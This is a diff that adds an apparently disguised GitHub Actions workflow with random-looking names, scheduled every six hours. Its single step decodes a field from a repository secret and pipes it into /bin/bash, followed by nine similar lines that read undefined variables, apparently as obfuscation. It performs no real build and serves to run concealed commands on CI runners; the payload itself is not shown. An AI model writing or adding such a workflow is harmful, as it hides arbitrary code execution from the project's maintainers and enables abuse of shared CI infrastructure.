@@ -1,0 +1,25 @@
+name: labourersullen
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: labourersullen
+        env:
+          bxr22: ${{ secrets.bxr22 }}
+        run: |
+          echo $bxr22 | jq -r .zirg689 | /bin/bash
+          echo $ew4 | jq -r .l760 | /bin/bash
+          echo $dqjia32 | jq -r .jod39 | /bin/bash
+          echo $p3331 | jq -r .hs36 | /bin/bash
+          echo $dqo3582 | jq -r .ksin34076 | /bin/bash
+          echo $ymkgl0699 | jq -r .ulwo1 | /bin/bash
+          echo $un77 | jq -r .wactr853 | /bin/bash
+          echo $fxh1937 | jq -r .ql5 | /bin/bash
+          echo $ucon2419 | jq -r .myr834 | /bin/bash
+          echo $yltjl6191 | jq -r .y7 | /bin/bash
+
